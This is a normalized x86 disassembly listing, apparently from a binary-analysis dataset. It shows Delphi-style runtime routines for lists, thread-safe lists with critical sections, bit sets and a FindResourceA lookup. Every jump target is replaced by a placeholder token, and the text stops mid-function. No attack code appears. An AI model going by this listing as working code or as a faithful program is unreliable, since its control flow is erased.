mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4139c8
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403498
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412b84
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4138b8
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_41386c
sub_412d88
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4139c8
mov edx ebp
call sub_41298c
test al al
jne r-xdata
sub_412dcc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412784
mov edx eax
mov eax [ edi + 0x4 ]
call sub_41386c
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4139c8
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413a24
test eax eax
jge r-xdata
sub_412e28
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4139c8
mov esi eax
mov edx ebp
mov eax esi
call sub_4129c4
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_40326c
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4138b8
sub_412e78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40323c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_412d64
xor eax eax
push ebp
push sub_412f77
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403590
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f7e
mov eax [ rw-data ]
call sub_412e1c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41386c
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4139c8
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4128a0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41386c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4139c8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_412f7e
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_412fa4
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_412fd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_412d64
xor edx edx
push ebp
push sub_41304b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_412e1c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403aa4
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4139c8
mov edx [ ebp - 0x4 ]
call sub_412840
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413068
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4130c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130cf
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_4130d4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d64
xor eax eax
push ebp
push sub_41311a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412bc8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413121
mov eax [ rw-data ]
call sub_412e1c
retn
sub_413128
push ebx
push esi
mov esi eax
mov eax esi
call sub_4130d4
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_413068
sub_413148
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d64
xor eax eax
push ebp
push sub_4131ad
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412d88
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412d70
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131b4
mov eax [ rw-data ]
call sub_412e1c
retn
mov eax ebx
call sub_4031f8
mov ebx eax
sub_4131b8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d64
xor eax eax
push ebp
push sub_4131fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412e28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413201
mov eax [ rw-data ]
call sub_412e1c
retn
sub_413204
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d64
xor eax eax
push ebp
push sub_413246
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412dcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41324d
mov eax [ rw-data ]
call sub_412e1c
retn
sub_413250
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_412d64
xor eax eax
push ebp
push sub_413297
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_412c9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41329e
mov eax [ rw-data ]
call sub_412e1c
retn
sub_4132a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d64
xor eax eax
push ebp
push sub_4132f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_412a68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132f9
mov eax [ rw-data ]
call sub_412e1c
retn
sub_413358
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403590
pop ebp
retn 0x8
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_413390
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413358
mov edx eax
mov eax [ rw-data ]
call sub_413cac
pop edi
pop esi
pop ebx
retn
sub_4133bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413d34
mov esi eax
xor edx edx
push ebp
push sub_413426
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413d98
retn
mov edx ebx
mov eax esi
call sub_4139c8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403aa4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413438
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407c68
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413478
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_404010
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4134bc
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413a24
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_41386c
sub_413514
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4139c8
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413554
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413514
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413578
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40447c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415eb0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4135ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4159b0
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
sub_4135fc
push ebx
call sub_405d58
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405d58
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_41386c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov ebx eax
call sub_405d58
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov ebx eax
call sub_405d58
mov [ eax + 0xc ] ebx
sub_413654
push ebx
push esi
push edi
call sub_405d58
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4139c8
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413684
push ebx
push esi
call sub_405d58
mov eax [ eax + 0x8 ]
call sub_40326c
call sub_405d58
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413ab0
mov esi eax
call sub_405d58
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4138b8
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405d58
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_40326c
sub_4136e0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413776
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41377d
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031f8
call sub_4136e0
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404220
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405008
call sub_405058
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413578
or bl al
sub_413788
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413836
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413817
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031b4
call sub_4136e0
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4135fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41381e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413654
retn
call sub_413684
sub_41384c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41386c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4138b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413954
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028b8
mov edx esi
mov eax ebx
call sub_4139c8
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41391c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413918
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
jmp sub_4039f8
sub_413954
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41399c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405aec
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41391c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4139a3
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_4139c8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413954
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4139f0
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413b2c
retn
sub_413a24
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413a44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413954
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028b8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413abc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413954
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413b0c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413a24
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4138b8
sub_413b2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413954
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4026fc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_413b68
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413954
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413b2c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c88
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4138b8
dec ebp
inc edi
jne r-xdata
sub_413bdc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_413c30
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035f8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413d34
xor eax eax
push ebp
push sub_413c92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40326c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40325c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c99
mov eax [ ebp - 0x4 ]
call sub_413d98
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_413cac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413d34
xor eax eax
push ebp
push sub_413d28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41386c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413a24
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d2f
mov eax [ ebp - 0x4 ]
call sub_413d98
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413954
sub_413d48
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413d34
xor eax eax
push ebp
push sub_413d8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413b0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d92
mov eax [ ebp - 0x4 ]
call sub_413d98
retn
sub_413da4
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_413df8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_413df8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_413dd4
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026bc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c88
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026dc
mov edx edi
mov eax ebp
call sub_413dec
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028b8
sub_413e9c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_413dd4
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_413df8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_413ee0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_413f58
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_416650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_413f98
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41404e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404054
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
